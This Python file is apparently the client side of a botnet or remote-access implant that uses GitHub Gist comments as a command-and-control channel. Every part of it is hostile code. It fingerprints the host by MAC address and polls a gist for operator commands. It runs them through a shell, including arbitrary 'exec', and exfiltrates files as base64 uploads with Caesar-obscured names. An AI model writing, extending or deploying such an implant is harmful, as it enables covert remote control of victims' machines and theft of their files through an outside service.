from api_wrapper import create_comment,get_comments, get_gist_id_from_description, update_comment, put_file_on_gist
from names_generator import generate_name
from utils import caesar_encrypt
import uuid
import subprocess
import steganography


mac = str(uuid.getnode()) # Unique identifier for the device (MAC address).
name = generate_name(seed=mac) # Random name for the device based on its MAC. E.g. "Clever Llama"

def process_command(command):
    print(f"Processing command: {command}")
    os_command = ""

    if command == "w":
        os_command = "w"
    elif command == "id":
        os_command = "id"
    elif command.startswith("ls"):
        path = command.replace("ls ","")
        os_command = f"ls {path}"
    elif command.startswith("cp"):
        remote_path = command.replace("cp ","")
        # We will use base64 to encode the file and then decode it in the controller
        # This will allow us to send binary files (e.g. images) as plain text
        os_command = f"cat {remote_path} | base64"
    elif command.startswith("exec"):
        binary_path = command.replace("exec ","")
        os_command= f"{binary_path}"
    else:
        return ("Command not recognized")
    
    # Execute os_command in the background and store the output
    proc = subprocess.run(os_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    stdout = proc.stdout.decode('utf-8')
    stderr = proc.stderr.decode('utf-8')
    # Return the output and if there was an error
    return stdout + stderr, stderr != '' 
    

def check_pending_commands():

    # The gist that the commander creates for this user contains his name
    humanized_name = name.replace("_", " ").title()
    my_gist_id = get_gist_id_from_description(humanized_name) or None
    
    # If the gist doesn't exist, the controller has never sent a command to this device
    if my_gist_id is None:
        return
    
    comments = get_comments(my_gist_id)

    # A comment x will be pending (not answered) if it doesn't contain a reply.
    # A reply is a comment of the format " > <original message>\n<reply>"
    # We will only keep the comments that have not been answered (i.e, commands that have not been processed)
    not_answered_comments = list(filter(lambda x: not x['body'].startswith('>') # The comment itself is not a reply
    and x['body'].startswith('⏱️')
    , comments))

    print("Processing commands...")
    for comment in not_answered_comments:
        command = comment['body'].replace("⏱️ ","")
        
        output, has_error = process_command(command)

        MAX_COMMENT_LENGTH = 65535
        if (command.startswith("cp") or len(output) > MAX_COMMENT_LENGTH) and not has_error:
            file_name = command.split("/")[-1].replace("\"","")
            # The filename will also be encoded
            file_name = caesar_encrypt(file_name, steganography.caesar_constant)
            # Upload the b64 encoded file to the gist
            response = put_file_on_gist(my_gist_id, file_name, output)
            file_url = response["files"][file_name]["raw_url"]
            output = f"📎 [{file_name}]({file_url})"
        
        # Post the reply to the command
        command = f"{'❌' if has_error else '✅'} {command}"[:MAX_COMMENT_LENGTH] # In case the command is too long, we will truncate it for the reply
        update_comment(my_gist_id, comment["id"], command) # Update the command comment to show that it has been processed
        create_comment(my_gist_id,f"> {command}\r\n\r\n{output}") # Post the reply to the command